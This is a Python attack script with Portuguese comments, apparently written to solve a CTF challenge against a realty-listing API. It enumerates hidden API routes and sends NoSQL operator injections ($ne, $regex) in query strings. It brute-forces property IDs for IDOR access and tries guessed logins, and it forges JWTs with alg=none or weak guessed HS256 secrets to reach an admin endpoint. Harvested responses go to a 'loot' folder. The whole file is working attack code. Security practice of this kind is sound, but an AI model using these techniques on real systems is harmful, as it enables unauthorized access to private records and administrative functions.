#!/usr/bin/env python3
import base64
import hashlib
import hmac
import json
import re
import sys
from pathlib import Path
from urllib.parse import urlencode

import requests
from urllib3.exceptions import InsecureRequestWarning

# Desativa warnings TLS comuns em ambiente CTF.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET_HOST = "87e6bb1481310f67.chal.ctf.ae"
BASE = f"https://{TARGET_HOST}"

Path("loot").mkdir(exist_ok=True)

# Headers reproduzidos do app Android decompilado.
BASE_HEADERS = {
    "X-App-Version": "3.7.2",
    "X-Platform": "android",
    "User-Agent": "FluidRealty/3.7.2 Android WebView",
    "Accept": "application/json, text/plain, */*",
}

# Palavras que tornam uma resposta interessante para inspeção.
INTERESTING_PATTERNS = [
    r"flag\{[^}\r\n]+\}",
    r"token",
    r"secret",
    r"admin",
    r"private",
    r"hidden",
    r"internal",
    r"draft",
    r"vip",
    r"auth",
    r"jwt",
]


def b64url(data: bytes) -> str:
    """
    Codifica bytes em Base64 URL-safe sem padding.
    JWT usa exatamente esse formato.
    """
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def make_jwt_none(payload: dict) -> str:
    """
    Cria JWT com alg=none.
    Alguns backends mal configurados aceitam esse tipo de token sem assinatura.
    """
    header = {"alg": "none", "typ": "JWT"}
    return (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
        + "."
    )


def make_jwt_hs256(payload: dict, secret: str) -> str:
    """
    Cria JWT HS256 com segredo candidato.
    Útil quando o backend usa segredo fraco ou previsível.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    signing_input = (
        b64url(json.dumps(header, separators=(",", ":")).encode())
        + "."
        + b64url(json.dumps(payload, separators=(",", ":")).encode())
    )
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def pretty(text: str) -> str:
    """
    Formata JSON quando possível.
    """
    try:
        return json.dumps(json.loads(text), indent=2, ensure_ascii=False)
    except Exception:
        return text


def save_result(label: str, response: requests.Response) -> Path:
    """
    Salva resposta completa em loot/script2_<label>.txt.
    """
    safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", label).strip("_")
    path = Path("loot") / f"script2_{safe}.txt"

    lines = []
    lines.append(f"URL: {response.url}")
    lines.append(f"STATUS: {response.status_code}")
    lines.append("")
    lines.append("HEADERS:")
    for k, v in response.headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append("BODY:")
    lines.append(pretty(response.text))

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


def is_interesting(response: requests.Response) -> bool:
    """
    Decide se vale imprimir a resposta no terminal.
    Evita poluir o output com 404/401 repetidos.
    """
    body = response.text
    lowered = body.lower()

    if response.status_code in [200, 201, 202, 204, 301, 302, 500]:
        return True

    for pattern in INTERESTING_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE):
            return True

    if len(body) > 120 and response.status_code not in [404]:
        return True

    return False


def print_response(label: str, response: requests.Response):
    """
    Mostra resposta interessante e procura flag automaticamente.
    """
    saved = save_result(label, response)

    if not is_interesting(response):
        return

    print()
    print("=" * 100)
    print(label)
    print("=" * 100)
    print(f"URL: {response.url}")
    print(f"Status: {response.status_code}")
    print(f"Tamanho: {len(response.text)} bytes")
    print(f"Salvo em: {saved}")

    preview = pretty(response.text)
    if len(preview) > 1600:
        preview = preview[:1600] + "\n...[preview cortado, resposta completa no loot]"
    print()
    print(preview)

    match = re.search(r"flag\{[^}\r\n]+\}", response.text, re.IGNORECASE)
    if match:
        flag = match.group(0)
        print()
        print("=" * 100)
        print("[+] FLAG ENCONTRADA")
        print("=" * 100)
        print(flag)
        Path("flag.txt").write_text(flag + "\n", encoding="utf-8")
        print("[+] Flag salva em flag.txt")
        sys.exit(0)


def req(label: str, method: str, path: str, headers=None, params=None, json_body=None):
    """
    Executa GET/POST/OPTIONS com timeout curto.
    """
    merged_headers = dict(BASE_HEADERS)
    if headers:
        merged_headers.update(headers)

    url = BASE + path

    try:
        response = requests.request(
            method,
            url,
            headers=merged_headers,
            params=params,
            json=json_body,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        print_response(label, response)
        return response
    except requests.RequestException as exc:
        print()
        print("=" * 100)
        print(label)
        print("=" * 100)
        print(f"Erro: {exc}")
        return None


def test_web_and_api_discovery():
    """
    Enumera rotas web/API prováveis com base no app decompilado.
    """
    paths = [
        "/",
        "/robots.txt",
        "/sitemap.xml",
        "/mobile",
        "/mobile/home",
        "/app",
        "/app/mobile/home",
        "/api",
        "/api/",
        "/api/health",
        "/api/status",
        "/api/version",
        "/api/config",
        "/api/debug",
        "/api/debug/config",
        "/api/mobile",
        "/api/mobile/config",
        "/api/mobile/home",
        "/api/auth",
        "/api/auth/token",
        "/api/auth/login",
        "/api/auth/session",
        "/api/auth/guest",
        "/api/token",
        "/api/session",
        "/api/login",
        "/api/users/me",
        "/api/me",
        "/api/admin",
        "/api/admin/properties",
        "/api/properties/private",
        "/api/properties/hidden",
        "/api/properties/admin",
    ]

    for path in paths:
        req(f"DISCOVERY GET {path}", "GET", path)
        req(f"DISCOVERY OPTIONS {path}", "OPTIONS", path)


def test_property_queries():
    """
    Testa query parameters que podem revelar registros privados.
    """
    raw_queries = [
        "",
        "city=Bogota",
        "city=Medellin",
        "city=Cartagena",
        "city=Santa%20Marta",
        "city=Pereira",
        "city[$ne]=",
        "city[$ne]=Bogota",
        "city[$regex]=.*",
        "city[$exists]=true",
        "status=available",
        "status=reserved",
        "status=private",
        "status=hidden",
        "status[$ne]=",
        "private=true",
        "private=false",
        "hidden=true",
        "admin=true",
        "internal=true",
        "include_private=true",
        "includePrivate=true",
        "includeHidden=true",
        "show_private=true",
        "debug=true",
        "all=true",
        "limit=100",
        "page=1&limit=100",
        "offset=0&limit=100",
        "q=flag",
        "search=flag",
        "filter=private",
    ]

    for query in raw_queries:
        path = "/api/properties"
        if query:
            path += "?" + query
        req(f"QUERY GET {path}", "GET", path)


def test_property_idor():
    """
    Testa acesso direto a detalhes de imóveis.
    A listagem pública mostra IDs 1 a 5; privados podem começar em 6.
    """
    route_templates = [
        "/api/properties/{id}",
        "/api/property/{id}",
        "/api/properties/detail/{id}",
        "/api/properties/admin/{id}",
    ]

    for i in range(1, 81):
        for template in route_templates:
            path = template.format(id=i)
            response = req(f"IDOR GET {path}", "GET", path)

            # Se a rota existir para IDs públicos, imprime também os vizinhos privados.
            if response is not None and response.status_code == 200:
                pass


def test_auth_endpoints():
    """
    Testa endpoints de token com campos sugeridos pelo código:
    deviceId, appVersion e platform.
    """
    bodies = [
        {},
        {"username": "guerreiro", "password": "guerreiro"},
        {"email": "guerreiro@computaria.com", "password": "guerreiro"},
        {"device_id": "guerreiro-device", "app_version": "3.7.2", "platform": "android"},
        {"deviceId": "guerreiro-device", "appVersion": "3.7.2", "platform": "android"},
        {"android_id": "guerreiro-device", "version": "3.7.2"},
        {"role": "admin"},
        {"user": "admin"},
    ]

    paths = [
        "/api/auth/token",
        "/api/auth/guest",
        "/api/auth/session",
        "/api/auth/login",
        "/api/token",
        "/api/session",
        "/api/login",
        "/api/mobile/token",
        "/api/mobile/auth",
    ]

    for path in paths:
        for body in bodies:
            req(f"AUTH POST {path} body={body}", "POST", path, json_body=body)


def test_jwt_admin():
    """
    Cria tokens JWT candidatos e testa no endpoint admin.
    """
    payloads = [
        {"sub": "guerreiro", "role": "admin"},
        {"user": "guerreiro", "role": "admin"},
        {"username": "guerreiro", "role": "admin"},
        {"sub": "admin", "role": "admin"},
        {"user": "admin", "admin": True},
        {"is_admin": True, "role": "admin"},
        {"scope": "admin", "role": "admin"},
        {"aud": "fluidrealty", "role": "admin"},
        {"iss": "fluidrealty", "sub": "admin", "role": "admin"},
        {"iss": "fluidrealty-mobile", "sub": "admin", "role": "admin"},
    ]

    secrets = [
        "secret",
        "admin",
        "fluidrealty",
        "FluidRealty",
        "fluidrealty-api",
        "fluidrealty-mobile",
        "mobile",
        "android",
        "3.7.2",
        "api.fluidrealty.co",
        "glass-houses",
        "properties",
    ]

    tokens = []

    for payload in payloads:
        tokens.append(("jwt-none", make_jwt_none(payload)))

        for secret in secrets:
            tokens.append((f"jwt-hs256-secret-{secret}", make_jwt_hs256(payload, secret)))

    seen = set()
    for label, token in tokens:
        if token in seen:
            continue
        seen.add(token)

        req(
            f"JWT ADMIN {label}",
            "GET",
            "/api/properties/admin",
            headers={"Authorization": f"Bearer {token}"},
        )


def main():
    print("[*] Script 2: enumeração aprofundada da API Glass Houses")
    print(f"[*] Base: {BASE}")
    print("[*] Foco: endpoints escondidos, query injection, IDOR e JWT fraco")

    test_web_and_api_discovery()
    test_property_queries()
    test_property_idor()
    test_auth_endpoints()
    test_jwt_admin()

    print()
    print("=" * 100)
    print("RESULTADO FINAL")
    print("=" * 100)
    print("[-] Flag não encontrada automaticamente.")
    print("[*] Rode este comando para ver respostas interessantes salvas:")
    print("grep -RniE 'flag|private|hidden|admin|token|secret|internal|draft|vip' loot/script2_*.txt")

if __name__ == "__main__":
    main()
